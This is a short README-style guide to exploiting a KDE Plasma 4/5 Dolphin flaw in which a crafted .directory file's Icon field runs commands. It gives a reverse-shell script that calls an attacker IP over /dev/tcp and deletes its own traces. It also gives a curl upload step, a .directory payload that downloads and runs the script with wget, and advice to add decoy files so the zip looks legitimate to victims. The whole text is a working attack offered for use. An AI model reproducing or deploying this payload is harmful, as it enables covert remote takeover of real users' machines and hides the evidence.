# KDE-ARBITRARY-CODE-EXECUTION-AUTOCLEAN
KDE Plasma 4 & 5

First off you need to upload a .sh file with the following format
```bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1 | rm /home/$USER/Downloads/NAME_OF_EXTRACTED_FOLDER/.directory | rm /home/$USER/*.sh
```
I would suggest using https://0x0.st with the following command
```
curl -F'file=@FILENAME.sh' https://0x0.st
```
It will retun a link for your shell script.

Now wee need to make the payload named .directory to add to our .zip
```
[Dolphin]
Timestamp=2019,7,28,20,21,14
Version=4

[Desktop Entry]
Type=Directory
Icon[$e]=$(wget${IFS}https://0x0.st/FILENAME.sh&&/bin/bash${IFS}FILENAME.sh)
```
Replace FILENAME.sh with your 0x0.st file name

now save this as .directory, in a folder name of your choice, you should also add other things in it, to make it look legit.
then run
```
zip -r FOLDERNAME.zip FOLDERNAME
```
remeber this folders name needs to match the name of the folder in your shell script, or it will not rm the .directory file.
(NAME_OF_EXTRACTED_FOLDER)

What will happen, is when the user unzips this and has Dolphin file manager opened the Icon part will be executed, Which grabs and runs our .sh, which our .sh will connect to attacker server, and also rm the .directory file along with the .sh we grabbed, which will kind of hide what happened, but it will also keep multiple sessions from being started. 
